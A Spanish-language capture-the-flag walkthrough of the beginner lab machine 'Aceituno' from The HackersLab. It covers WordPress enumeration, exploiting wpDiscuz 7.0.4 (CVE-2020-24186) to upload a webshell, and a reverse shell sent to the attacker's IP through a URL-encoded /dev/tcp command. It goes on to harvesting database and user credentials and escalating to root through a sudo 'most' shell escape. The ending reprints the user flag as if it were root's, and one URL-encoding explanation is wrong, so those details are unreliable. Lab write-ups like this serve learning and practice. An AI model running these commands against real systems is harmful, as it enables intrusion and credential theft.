# ACEITUNO

Máquina de nivel principiante de The HackersLab. IP: `192.168.100.158` — dominio: `aceituno.thl`.

## 1. Reconocimiento

Como primer paso, realizamos el reconocimiento de la máquina con `nmap`:

```
nmap -sV 192.168.100.158
```

![[Pasted image 20260922215947.png]]

Quedan abiertos cuatro puertos:

- **22/tcp** → OpenSSH 9.2p1 (Debian).
- **80/tcp** → Apache httpd 2.4.59 (página web).
- **443/tcp** → Apache httpd 2.4.59 (misma web en HTTPS).
- **3306/tcp** → MariaDB 5.5.5-10.11.6 (MySQL).

## 2. Enumeración de directorios con Gobuster

Con el puerto 80 abierto, pasamos a enumerar directorios con `gobuster`:

```
gobuster dir -u http://192.168.100.158 -w /usr/share/wordlists/dirb/common.txt -t 50
```

![[Pasted image 20260922220532.png]]

En los resultados vemos rutas como `/admin`, `/dashboard`, `/embed` o `/feed`, y lo más interesante: varias redirecciones (301/302) hacia `http://aceituno.thl/wp-admin/`. Eso nos confirma dos cosas: que estamos ante una instalación **WordPress** y que el sitio responde además bajo el dominio `aceituno.thl`.

## 3. Configuración del hosts

Para poder navegar por el dominio, añadimos una entrada en el archivo `/etc/hosts` que apunte a la IP de la máquina:

```
echo "192.168.100.158 aceituno.thl" >> /etc/hosts
```

A partir de aquí, el nombre de la página web es `http://aceituno.thl` y podemos acceder a ella desde el navegador:

![[Pasted image 20260922220822.png]]

## 4. Enumeración de WordPress con wpscan

Con el dominio ya funcionando, enumeramos los usuarios del WordPress con `wpscan`:

```
wpscan --url http://aceituno.thl -e u
```

![[Pasted image 20260922224212.png]]

La herramienta identifica al usuario **aceituno** (confirmado por el JSON API de WordPress, el sitemap de autores y la fuerza bruta de IDs).

Además, revisando el código fuente de la página, detectamos un plugin desactualizado y con mucho peligro: **wpDiscuz 7.0.4**.

![[Pasted image 20260922232208.png]]

## 5. Explotación: exploit 49967 (webshell)

Con la versión del plugin encontrada, nos encontramos con un [exploit](https://www.exploit-db.com/exploits/49967) (CVE-2020-24186) que permite subir una webshell. El exploit pide dos cosas: la ruta donde está instalado WordPress y la ruta de una publicación existente:

```
python3 49967.py -u http://192.168.100.158/ -p /2024/04/23/hola-mundo/
```

![[Pasted image 20260922231847.png]]

Al ejecutarlo, el script obtiene los valores de seguridad, genera un nombre aleatorio para la webshell, la sube con éxito y nos devuelve su ruta: `http://aceituno.thl/wp-content/uploads/2026/09/fjbqaeygosmjnzh-1790117659.1575.php`. Ya tenemos ejecución remota de comandos.

## 6. Reverse shell

Con la webshell no tenemos una terminal cómoda, así que lanzamos una reverse shell. En primer lado, en nuestra máquina preparamos el oyente con `nc` en el puerto 443:

```
nc -lvnp 443
```

![[Pasted image 20260922232837.png]]

Después, en la página web, añadimos en la URL el parámetro `cmd` con el comando de la reverse shell. Como estamos dentro de una URL, hay que codificar los caracteres especiales: `>` se escribe como `%26` (para `>&`) y `/` como `%2F`:

```
http://aceituno.thl/wp-content/uploads/2026/09/fjbqaeygosmjnzh-1790117659.1575.php?cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F192.168.100.91%2F443 0>%261"
```

![[Pasted image 20260922232918.png]]

Al abrir esa URL, la webshell ejecuta `bash -c "sh -i >& /dev/tcp/192.168.100.91/443 0>&1"` en el servidor y la conexión llega a nuestro `nc`.

## 7. Terminal interactiva

La shell que acabamos de obtener es muy básica: no hay tabulador, no funciona `Ctrl+C`/`Ctrl+Z` correctamente y no se puede limpiar la pantalla. Para convertirla en una terminal interactiva, seguimos estos pasos:

1. Ejecutamos el siguiente comando para darle soporte de shell interactiva:

   ```
   SHELL=/bin/bash script -q /dev/null
   ```

2. Pulsamos `Ctrl+Z`. Esto suspende el proceso y nos devuelve a la shell local de nuestro equipo.

3. Configuramos nuestro terminal local en modo raw sin eco y reanudamos (con `fg`) la shell remota:

   ```
   stty raw -echo && fg
   ```

4. Por último, exportamos la variable `TERM` para que el terminal se comporte como una xterm. Así funciona `Ctrl+L` para limpiar la pantalla y se corrige el borrado de comandos:

   ```
   export TERM=xterm
   ```

Con esto ya tenemos una terminal interactiva cómoda para seguir trabajando.

## 8. Búsqueda de información y base de datos

Una vez dentro del equipo, empezamos a movernos por el sistema buscando cualquier tipo de información que nos permita escalar privilegios. Recorremos el árbol de la web hasta llegar a `/var/www/html/wordpress`:

![[Pasted image 20260922233424.png]]

En ese directorio encontramos `wp-config.php`, el archivo de configuración de WordPress, y en él aparecen las credenciales de la base de datos:

![[Pasted image 20260922233607.png]]

- **Base de datos:** `wordpress`
- **Usuario:** `wp_user`
- **Contraseña:** `Tomamoreno`
- **Host:** `localhost`

Con esos datos nos conectamos a MySQL:

```
mysql -u wp_user -p -h localhost wordpress
```

![[Pasted image 20260922234931.png]]

Dentro del servidor de bases de datos, listamos las tablas con `show tables;` y vemos, además de las tablas propias de WordPress, una tabla llamada `pelopicopata`. Consultamos primero la tabla de usuarios de WordPress:

```
select * from wp_users;
```

![[Pasted image 20260922235742.png]]

Y a continuación la tabla sospechosa, que es donde está la información que buscamos:

```
select * from pelopicopata;
```

![[Pasted image 20260922235000.png]]

En ella aparecen el usuario y la clave de la página web:

- **Usuario:** `aceituno`
- **Contraseña:** `ElSeñorDeLaNoche`

## 9. Escalada de privilegios: usuario aceituno

Con esas credenciales nos cambiamos al usuario `aceituno` y leemos su flag de usuario:

![[Pasted image 20260923000957.png]]

```
cat user.txt
```

`f6cf451a8f0f8c14fd0a54e08b99b69c`

Siguendo con la enumeración de escalada (en la captura también se ve un intento fallido con `ssh2john`), ejecutamos `sudo -l` para comprobar qué binarios podemos lanzar con privilegios elevados:

![[Pasted image 20260923005843.png]]

## 10. Escalada a root con `most`

El hallazgo interesante es el binario **`most`**, un visor de textos que podemos ejecutar como root. Le pedimos que abra el archivo de la bandera de root:

```
sudo -u root /usr/bin/most /root/root.txt
```

La clave de esta máquina está en el propio `most`: al abrir el archivo somos root, y el visor nos permite ejecutar comandos del sistema con el carácter de escape `!`. Pulsamos `q` para salir de la vista del archivo y usamos ese escape para lanzar un shell; en la captura se ve escrito `!:bin/bash`:

![[Pasted image 20260923010114.png]]

Como `most` se lanzó con `sudo -u root`, el shell que obtenemos ya es de **root**. Comprobamos que somos root, listamos el directorio y leemos la bandera:

![[Pasted image 20260923005803.png]]

```
ls
cat user.txt
```

`f6cf451a8f0f8c14fd0a54e08b99b69c`

Con esto terminamos la máquina ACEITUNO.
